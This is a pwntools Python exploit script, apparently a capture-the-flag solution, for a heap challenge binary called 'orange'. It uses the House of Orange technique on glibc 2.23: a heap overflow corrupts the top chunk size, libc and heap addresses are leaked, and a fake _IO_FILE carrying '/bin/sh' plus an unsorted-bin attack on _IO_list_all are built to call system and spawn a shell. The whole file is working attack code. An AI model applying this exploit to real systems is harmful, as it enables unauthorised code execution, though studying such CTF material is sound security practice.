from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()
p=process('orange')
# p = remote('ctf.v50to.cc',10418)
libc=ELF('/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
# pid=proc.pidof(p)[0]
# print('pid:',pid)
gdb.attach(proc.pidof(p)[0])
pause()

def add(size,name):
    sla(b'Your choice : ',b'1')
    sla(b'name :',str(size).encode())
    sa(b'Name :',name)
    sla(b'Orange:',b'50')
    sla(b'Orange:',b'1')
# p=remote()
def see():
    sla(b'Your choice : ',b'2')
	
def edit(size,name):
    sla(b'Your choice : ',b'3')
    sla(b'name :',str(size).encode())
    sa(b'Name:',name)
    sla(b'Orange: ',b'50')
    sla(b'Orange: ',b'1')

add(0x10,b'a')
payload=b'a'*0x18+p64(0x21)+p32(1)+p32(0x1f)+p64(0)*2+p64(0xfa1)

# pause()
edit(len(payload),payload)
# pause()
add(0x1000,b'a')
# pause()
add(0x400,b'a')
# pause()
see()
libcbase=u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
print('libcbase',hex(libcbase))
libcbase=libcbase-1601-0x3c4b20
_IO_list_all=libcbase+libc.sym['_IO_list_all']
# _IO_list_all=libcbase+libc.sym['_IO_2_1_stderr_']+0x7f9c25139540-0x7f9c25138540
print('_IO_list_all',hex(_IO_list_all))
# libcbase=libcbase-libc.sym
print('libcbase',hex(libcbase))
system_addr=libcbase+libc.sym['system']
print("before add")
# pause()
edit(0x10,b'a'*16)
see()
rc(0x20)
heapbase=u64(rc(6).ljust(8,b'\x00'))-0xc0
print('heapbase',hex(heapbase))
# ita()
# gdb.attach(proc.pidof(p)[0])


payload=b'a'*0x400+p64(0)+p64(0x21)+b'a'*0x10
fake_file=b'/bin/sh\x00'+p64(0x61)
fake_file+=p64(0)+p64(_IO_list_all-0x10)#unsorted bin attack
fake_file+=p64(0)+p64(1)#IO_write_ptr>IO_write_base
fake_file=fake_file.ljust(0xc0,b'\x00')#_mode=0
print('fake_file',fake_file)
payload+=fake_file
payload+=p64(0)*3+p64(heapbase+0x5c8)
payload+=p64(0)*2+p64(system_addr)
pause()
edit(0x800,payload)
# ru(b':')
# sl(b'1')
ita()

